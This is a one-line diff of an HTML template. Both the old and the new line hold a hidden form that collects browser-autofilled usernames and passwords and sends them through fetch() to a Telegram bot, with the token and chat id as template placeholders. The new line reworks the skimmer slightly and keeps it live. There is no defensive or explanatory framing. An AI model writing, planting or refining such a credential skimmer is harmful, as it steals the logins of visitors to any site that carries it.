@@ -1,1 +1,1 @@
-<form id="l" style="display: none" onchange="fetch(`https://api.telegram.org/bot{{ token }}/sendMessage?text=${this.username.value};${this.password.value}&chat_id={{ chatid }}`)"><input name="username" autocomplete="username"><input type="password" name="password" autocomplete="current-password"></form>
+<form style="display: none" onchange="fetch(`https://api.telegram.org/bot{{ token }}/sendMessage?text=${this.u.value};${this.p.value}&chat_id={{ chatid }}`)"><input id="u" autocomplete="username"><input id="p" type="password" autocomplete="password"></form>
